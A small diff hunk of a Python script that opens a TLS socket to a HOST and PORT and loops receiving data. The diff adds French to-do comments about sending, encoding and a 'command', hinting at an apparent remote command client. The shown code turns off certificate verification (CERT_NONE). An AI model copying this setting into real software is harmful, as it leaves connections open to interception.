@@ -29,6 +29,10 @@ context.verify_mode = ssl.CERT_NONE
 wrappedSocket = context.wrap_socket(sock, server_hostname=HOST)
 wrappedSocket.connect((HOST, PORT))
 
+# à mettre dans une fonction
+# send socket + encoding
+# + d'espace
+# command
 try:
    while wrappedSocket:
         received_data = wrappedSocket.recv(BUFFER_SIZE)
